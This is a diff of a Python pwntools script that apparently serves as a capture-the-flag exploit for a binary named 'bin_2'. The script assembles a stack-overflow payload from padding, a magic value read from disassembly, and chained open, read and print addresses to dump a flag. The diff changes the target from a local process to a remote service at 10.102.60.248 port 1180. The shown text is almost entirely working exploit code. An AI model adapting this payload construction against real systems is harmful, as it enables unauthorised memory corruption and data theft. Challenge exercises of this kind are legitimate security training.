@@ -81,9 +81,10 @@ proc.close()
 print(readaddr)
 
 flagaddr = p64(0x40a2b5)
-fd = p32(0x3)
-#printaddr = p64(0x40a2aa)
-printaddr = p64(0x40c008)
+#openflag = p32(0x0)
+fd = p32(0x6)
+printaddr = p64(0x40a2aa)
+#printaddr = p64(0x40c008)
 length = p64(0x20)
 
 cmd = " awk '/<vuln>:/,/lea/{print}' bin_2.asm"
@@ -95,13 +96,13 @@ if buflen > 2**63:
 magic = p32(int(buf[5].split('\t')[2].split()[1].split(',')[0][1:],16))
 rbp = b'A'*8
 shellcode = b'A'*(buflen-4)+magic+rbp+openaddr+readaddr+flagaddr+fd+printaddr+length
-#shellcode = 'A'*(buflen-4)+magic+rbp+addr
+#shellcode = b'A'*(buflen-4)+magic+rbp+addr
 
-cmd = "chmod +x bin_2"
-os.system(cmd)
-io = process('./bin_2')
+#cmd = "chmod +x bin_2"
+#os.system(cmd)
+#io = process('./bin_2')
 
-#io = remote('10.102.60.248',1180)
+io = remote('10.102.60.248',1180)
 #io = remote('127.0.0.1',5000)
 
 io.recvuntil(' hmmm.....')
